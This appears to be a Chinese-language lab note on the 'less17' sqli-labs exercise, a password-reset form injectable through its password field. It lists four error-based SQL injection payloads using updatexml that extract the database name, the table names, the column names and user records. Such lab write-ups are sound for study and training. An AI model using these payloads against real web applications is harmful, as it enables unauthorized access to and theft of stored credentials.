---
title: less17
url: https://www.yuque.com/u29002979/ep2zrx/ke7ss7lpyoyfocak
---

```bash
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
```

`uname=1'`

> \[PASSWORD RESET]

提示密码重设置,
&#x20;**注入点是密码的位置** <a name="irTrU"></a>

# 报错注入

```bash
查询数据库表
passwd=admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- +
爆破数据表
passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- +
爆破字段名
passwd=1' and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1) -- +
爆破字段
passwd=1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- +
```
